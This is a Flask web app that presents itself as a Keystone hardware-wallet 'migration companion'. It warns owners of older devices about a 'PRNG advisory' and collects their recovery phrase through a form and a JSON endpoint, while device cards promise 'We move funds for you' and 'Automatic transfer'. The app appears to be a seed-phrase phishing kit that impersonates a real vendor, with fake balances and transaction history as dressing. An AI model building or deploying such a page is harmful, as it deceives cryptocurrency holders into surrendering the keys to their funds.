"""Keystone Nexus Web — wallet migration companion (Python/Flask)."""

from __future__ import annotations

from flask import Flask, flash, jsonify, redirect, render_template, request, session, url_for

from bip39_utils import (
    generate_secure_phrase,
    is_bip39,
    phrase_words,
    suggest_words,
    validate_bip39,
)
from compromised import is_compromised, mark_compromised

app = Flask(__name__)
app.secret_key = "nexus-migration-session"

CURRENT_DEVICES = [
    {
        "id": "k3-pro",
        "name": "Keystone 3 Pro",
        "tagline": "Primary migration path for multi-chain wallets.",
        "badge": "Recommended",
        "badge_tone": "tone-rec",
        "image": "img/device-3pro.webp",
        "firmware": "Multi-Coin · v2.1+",
        "status": "Migration ready",
        "accent": "#3d71ff",
        "specs": ["4″ touchscreen", "Triple secure element", "Phrase migration"],
        "generation": "current",
    },
    {
        "id": "k3-pro-btc",
        "name": "Keystone 3 Pro",
        "tagline": "Bitcoin-only firmware for the smallest attack surface.",
        "badge": "BTC-Only",
        "badge_tone": "tone-btc",
        "image": "img/device-3pro.webp",
        "firmware": "Bitcoin-Only · v2.1+",
        "status": "Migration ready",
        "accent": "#f7931a",
        "specs": ["PSBT & multisig", "Reduced codebase", "Phrase migration"],
        "generation": "current",
    },
    {
        "id": "k3-pro-custom",
        "name": "Keystone 3 Pro Custom",
        "tagline": "Co-branded and limited editions — same migration flow.",
        "badge": "All editions",
        "badge_tone": "tone-alt",
        "image": "img/device-3pro.webp",
        "firmware": "Multi-Coin · v2.1+",
        "status": "Supported",
        "accent": "#1dbbf5",
        "specs": ["Same 3 Pro hardware", "Custom shell / art", "Phrase migration"],
        "generation": "current",
    },
]

PREVIOUS_DEVICES = [
    {
        "id": "k-pro",
        "name": "Keystone Pro",
        "tagline": "Previous-gen touchscreen cold wallet. Assisted fund migration.",
        "badge": "Previous",
        "badge_tone": "tone-prev",
        "image": None,
        "shell": "pro",
        "firmware": "Legacy multi-coin",
        "status": "Assisted migrate",
        "accent": "#8b93a7",
        "specs": ["Enter recovery phrase", "We move funds for you", "New BIP39 seed issued"],
        "generation": "previous",
    },
    {
        "id": "k-essential",
        "name": "Keystone Essential",
        "tagline": "Earlier Essential series devices affected by the PRNG advisory.",
        "badge": "Previous",
        "badge_tone": "tone-prev",
        "image": None,
        "shell": "essential",
        "firmware": "Legacy multi-coin",
        "status": "Assisted migrate",
        "accent": "#6b7385",
        "specs": ["Phrase import", "Automatic transfer", "Secure replacement seed"],
        "generation": "previous",
    },
    {
        "id": "k3",
        "name": "Keystone 3",
        "tagline": "Keystone 3 (non-Pro). Same migration flow as prior models.",
        "badge": "Previous",
        "badge_tone": "tone-prev",
        "image": "img/device-3pro.webp",
        "shell": None,
        "firmware": "Legacy · update required",
        "status": "Assisted migrate",
        "accent": "#9aa3b5",
        "specs": ["Phrase import", "Automatic transfer", "24-word secure seed"],
        "generation": "previous",
    },
]

DEVICES = CURRENT_DEVICES + PREVIOUS_DEVICES

WALLET = {
    "name": "Keystone Pro 01",
    "address": "0x49ab...2dsfg3",
    "full_address": "0x49ab7c2e91f04d8a2dsfg3e8c1a9b0d4f6e2a1c7",
    "total_balance": 60190.52,
}

NETWORKS = [
    {
        "id": "bitcoin",
        "name": "Bitcoin",
        "symbol": "BTC",
        "price": 97542.18,
        "change": 2.4,
        "balance": 0.3821,
        "value": 37260.40,
        "color": "#F7931A",
        "address": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
        "tokens": [],
        "history": [],
    },
    {
        "id": "ethereum",
        "name": "Ethereum",
        "symbol": "ETH",
        "price": 3436.86,
        "change": 2.4,
        "balance": 3.23,
        "value": 13578.33,
        "color": "#627EEA",
        "address": "0x49ab7c2e91f04d8a2dsfg3e8c1a9b0d4f6e2a1c7",
        "tokens": [
            {
                "symbol": "ETH",
                "name": "Ethereum",
                "price": 3436.86,
                "change": 2.4,
                "balance": 3.23,
                "value": 11101.95,
                "color": "#627EEA",
            },
            {
                "symbol": "USDT",
                "name": "Tether",
                "price": 1.0,
                "change": 0.01,
                "balance": 1240.00,
                "value": 1240.00,
                "color": "#26A17B",
            },
            {
                "symbol": "USDC",
                "name": "USD Coin",
                "price": 1.0,
                "change": 0.0,
                "balance": 42.23,
                "value": 42.23,
                "color": "#2775CA",
            },
            {
                "symbol": "BNB",
                "name": "BNB",
                "price": 612.40,
                "change": -0.8,
                "balance": 1.95,
                "value": 1194.18,
                "color": "#F3BA2F",
            },
        ],
        "history": [
            {
                "type": "send",
                "to": "0x5FaR...37hdc1",
                "amount": "-0.032 ETH",
                "positive": False,
            },
            {
                "type": "swap",
                "label": "ETH → BTC",
                "sub": "Ethereum To Bitcoin",
                "amount": "+0.0002 BTC",
                "positive": True,
            },
            {
                "type": "receive",
                "from": "0x5FbDB...480aa3",
                "amount": "+0.021 ETH",
                "positive": True,
            },
        ],
    },
    {
        "id": "tron",
        "name": "TRON",
        "symbol": "TRX",
        "price": 0.248,
        "change": -1.2,
        "balance": 18540.0,
        "value": 4597.92,
        "color": "#FF0013",
        "address": "TXyz49ab7c2e91f04d8a2dsfg3e8c1a9b0",
        "tokens": [],
        "history": [],
    },
    {
        "id": "doge",
        "name": "DOGE",
        "symbol": "DOGE",
        "price": 0.182,
        "change": 3.1,
        "balance": 12400.0,
        "value": 2256.80,
        "color": "#C2A633",
        "address": "D7YssieKeystoneMigrateAddr0001",
        "tokens": [],
        "history": [],
    },
    {
        "id": "xrp",
        "name": "XRP",
        "symbol": "XRP",
        "price": 2.48,
        "change": 1.6,
        "balance": 820.0,
        "value": 2033.60,
        "color": "#23292F",
        "address": "rN7KeystoneXrpMigrateAddr00001",
        "tokens": [],
        "history": [],
    },
    {
        "id": "bsc",
        "name": "BSC",
        "symbol": "BNB",
        "price": 612.40,
        "change": -0.8,
        "balance": 0.76,
        "value": 465.42,
        "color": "#F3BA2F",
        "address": "0x49ab7c2e91f04d8a2dsfg3e8c1a9b0d4f6e2a1c7",
        "tokens": [],
        "history": [],
    },
]


def get_network(network_id: str) -> dict | None:
    return next((n for n in NETWORKS if n["id"] == network_id), None)


def get_device(device_id: str) -> dict | None:
    return next((d for d in DEVICES if d["id"] == device_id), None)


def selected_device() -> dict | None:
    device_id = session.get("device_id")
    return get_device(device_id) if device_id else None


@app.context_processor
def inject_globals():
    device = selected_device()
    return {
        "wallet": {
            **WALLET,
            "connected": session.get("connected", False),
            "device": device,
            "migrated": session.get("migrated", False),
        },
        "nav_active": None,
        "show_compromised_banner": session.get("phrase_compromised", False),
    }


def clear_migration_progress():
    """Drop in-progress migration keys so users aren't stuck mid-flow."""
    for key in (
        "device_id",
        "connected",
        "import_verified",
        "import_word_count",
        "new_phrase",
        "new_phrase_verified",
        "phrase_compromised",
        "migrated",
    ):
        session.pop(key, None)


@app.route("/")
def index():
    return redirect(url_for("select_device"))


@app.route("/welcome")
def welcome():
    return redirect(url_for("select_device"))


@app.route("/select-device", methods=["GET", "POST"])
def select_device():
    if request.method == "POST":
        device_id = request.form.get("device_id", "")
        device = get_device(device_id)
        if not device:
            return redirect(url_for("select_device"))
        clear_migration_progress()
        session["device_id"] = device_id
        return redirect(url_for("migrate_import"))

    return render_template(
        "select_device.html",
        current_devices=CURRENT_DEVICES,
        previous_devices=PREVIOUS_DEVICES,
    )


@app.route("/connect")
def connect():
    return redirect(url_for("select_device"))


@app.route("/migrate/import", methods=["GET", "POST"])
def migrate_import():
    device = selected_device()
    if not device:
        return redirect(url_for("select_device"))

    error = None
    word_count = 0
    if request.method == "POST":
        phrase = request.form.get("phrase", "").strip()
        if not phrase:
            parts = [
                request.form.get(f"word_{i}", "").strip().lower()
                for i in range(1, 25)
            ]
            phrase = " ".join(p for p in parts if p)
        ok, message, words = validate_bip39(phrase)
        word_count = len(words)
        if not ok:
            lowered = message.lower()
            if "wordlist" in lowered:
                error = "One or more words look wrong — check for typos."
            elif "checksum" in lowered:
                error = "Those words don’t make a valid phrase — double-check the order."
            elif "must be" in lowered:
                error = "Recovery phrases are usually 12 or 24 words."
            else:
                error = "This phrase isn’t valid yet — check your words."
        else:
            # Label old seed as compromised via hash only — never store the raw phrase.
            already = is_compromised(phrase)
            mark_compromised(phrase)
            session["phrase_compromised"] = True
            session["import_verified"] = True
            session["import_word_count"] = word_count
            session.pop("old_phrase", None)
            strength = 256 if request.form.get("strength", "256") == "256" else 128
            new_phrase = generate_secure_phrase(strength=strength)
            if not is_bip39(new_phrase):
                error = "Failed to generate a BIP39-compliant phrase. Try again."
            else:
                session["new_phrase"] = new_phrase
                session["new_phrase_verified"] = True
                session["was_already_compromised"] = already
                return redirect(url_for("migrate_new_phrase"))

    return render_template(
        "migrate_import.html",
        device=device,
        error=error,
        word_count=word_count,
    )


@app.route("/migrate/new-phrase", methods=["GET", "POST"])
def migrate_new_phrase():
    device = selected_device()
    if not device:
        return redirect(url_for("select_device"))
    if not session.get("import_verified") or not session.get("new_phrase"):
        return redirect(url_for("migrate_import"))

    new_phrase = session["new_phrase"]
    words = phrase_words(new_phrase)
    verified = is_bip39(new_phrase)

    if request.method == "POST":
        if not verified:
            flash("New phrase failed BIP39 verification.", "error")
            return redirect(url_for("migrate_import"))
        if request.form.get("confirm") != "1":
            flash("Confirm you have written down your new recovery phrase.", "error")
            return render_template(
                "migrate_new_phrase.html",
                device=device,
                words=words,
                word_count=len(words),
                verified=verified,
                confirm_error=True,
            )
        session["migrated"] = True
        session["connected"] = True
        session.pop("new_phrase", None)
        return redirect(url_for("migrate_done"))

    return render_template(
        "migrate_new_phrase.html",
        device=device,
        words=words,
        word_count=len(words),
        verified=verified,
        confirm_error=False,
    )


@app.route("/migrate/done")
def migrate_done():
    if not session.get("migrated"):
        return redirect(url_for("select_device"))
    device = selected_device()
    return render_template("migrate_done.html", device=device)


@app.route("/api/bip39/check", methods=["POST"])
def api_bip39_check():
    data = request.get_json(silent=True) or {}
    phrase = data.get("phrase", "")
    ok, message, words = validate_bip39(phrase)
    return jsonify(
        {
            "ok": ok,
            "message": message,
            "word_count": len(words),
            "words_preview": len(words),
            "compromised": bool(ok and is_compromised(phrase)),
        }
    )


@app.route("/api/bip39/suggest")
def api_bip39_suggest():
    prefix = request.args.get("q", "")
    return jsonify({"suggestions": suggest_words(prefix)})


@app.route("/home")
def home():
    if session.get("migrated"):
        return redirect(url_for("migrate_done"))
    return redirect(url_for("select_device"))


@app.route("/network/<path:_rest>")
@app.route("/send/<path:_rest>")
@app.route("/receive/<path:_rest>")
@app.route("/swap", methods=["GET", "POST"])
@app.route("/sign", methods=["GET", "POST"])
@app.route("/sign/complete", methods=["POST"])
def legacy_wallet_routes(_rest=None):
    if session.get("migrated"):
        return redirect(url_for("migrate_done"))
    return redirect(url_for("select_device"))


@app.route("/disconnect", methods=["POST"])
def disconnect():
    session.clear()
    return redirect(url_for("select_device"))


if __name__ == "__main__":
    app.run(debug=True, host="127.0.0.1", port=5000)
